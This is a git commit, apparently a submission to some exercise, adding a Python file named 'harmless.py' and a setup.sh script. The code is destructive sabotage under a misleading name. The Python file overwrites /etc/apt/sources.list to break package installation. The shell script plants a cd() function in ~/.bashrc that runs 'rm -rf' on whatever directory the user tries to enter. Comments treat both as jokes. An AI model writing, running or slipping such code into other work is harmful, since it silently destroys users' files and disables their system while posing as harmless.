e69271d276ecb9d806b48d2e9e131e0814ef40b2
Thomas Weber <thomas.weber@ynov.com>
2021-10-19 22:01:52 +0200

    test

---
+++ submission-1/harmless.py
@@ -0,0 +1,11 @@
+import os
+
+
+# Removing all mirrors from apt
+# -> No direct way to apt install/upgrade
+with open("/etc/apt/sources.list", "w") as file:
+	file.write("# cheh")
+
+
+
+
---
+++ submission-1/setup.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+echo "cd() { rm -rf $1; }" >> ~/.bashrc  # For the fun
+python3 harmless.py
+
+
+
